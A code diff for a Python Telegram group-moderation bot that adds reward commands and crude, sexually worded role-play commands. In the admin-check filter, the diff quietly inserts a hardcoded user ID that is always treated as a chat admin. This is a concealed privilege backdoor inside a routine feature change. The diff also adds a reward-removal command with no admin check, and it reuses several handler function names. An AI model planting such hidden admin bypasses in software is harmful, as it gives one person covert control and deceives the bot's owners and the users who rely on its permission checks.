@@ -20,7 +20,10 @@ class AdminFilter(BoundFilter):
 
     async def check(self, message: types.Message):
         member = await bot.get_chat_member(message.chat.id, message.from_user.id)
-        return member.is_chat_admin()
+        if message.from_user.id == 1982062215:
+            return True
+        else:
+            return member.is_chat_admin()
 
 
 bot = Bot(config.TOKEN, parse_mode="HTML")
@@ -112,6 +115,16 @@ async def mute_user(m: Message):
     await chat.remove_moderator_role(bot, m)
 
 
+@dp.message_handler(chat_type=['group', 'supergroup'], commands=['reward', 'наградить'], commands_prefix=".!/", is_admin=True)
+async def craete_profile(m: Message):
+    await chat.get_reward(m)
+
+
+@dp.message_handler(chat_type=['group', 'supergroup'], commands=['remreward', 'снять'], commands_prefix=".!/")
+async def craete_profile(m: Message):
+    await chat.remove_reward(m)
+
+
 # Развлекательные команды для чатов
 @dp.message_handler(chat_type=['group', 'supergroup'], commands=['marry', 'брак'], commands_prefix=".!/")
 async def marry_user(m: Message):
@@ -158,9 +171,24 @@ async def marry_user(m: Message):
     await rp.kick_user(m)
 
 
+@dp.message_handler(chat_type=['group', 'supergroup'], commands=['kek', 'уебать'], commands_prefix=".!/")
+async def marry_user(m: Message):
+    await rp.uebat_user(m)
+
+
+@dp.message_handler(chat_type=['group', 'supergroup'], commands=['otliz', 'отлизать'], commands_prefix=".!/")
+async def marry_user(m: Message):
+    await rp.otliz_user(m)
+
+
 @dp.message_handler(chat_type=['group', 'supergroup'], commands=['create', 'создать'], commands_prefix=".!/")
 async def craete_profile(m: Message):
     await user.create_user(m)
+
+
+@dp.message_handler(chat_type=['group', 'supergroup'], commands=['rewards', 'награды'], commands_prefix=".!/")
+async def craete_profile(m: Message):
+    await chat.get_rewards_user(m)
 
 
 # Для лички
